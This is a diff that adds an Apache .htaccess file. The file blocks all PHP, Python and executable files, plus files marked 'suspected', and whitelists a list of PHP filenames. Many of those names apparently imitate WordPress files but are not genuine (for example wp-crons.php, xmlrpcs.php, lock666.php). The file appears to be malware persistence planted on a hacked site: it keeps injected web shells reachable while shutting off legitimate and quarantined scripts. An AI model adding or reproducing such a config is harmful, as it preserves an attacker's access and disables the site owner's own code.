@@ -1,0 +1,16 @@
+<FilesMatch ".(PhP|php5|suspected|phtml|py|exe|php)$">
+ Order allow,deny
+ Deny from all
+</FilesMatch>
+<FilesMatch "^(index.php|wp-crons.php|jsdindex.php|postfs.php|wp-login.php|lofter.php|activate.php|router.php|wp-scripts.php|votes.php|term.php|themes.php|wjsindex.php|font-editor.php|radio.php|link.php|contents.php|load.php|xmlrpcs.php|network.php|access.php|wp.php|loads.php|tools.php|locale.php|repeater.php|uninstall.php|container.php|scindex.php|wp-load.php|admin.php|settings.php|wp-study.php|lock666.php|ms-sites.php|upload.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
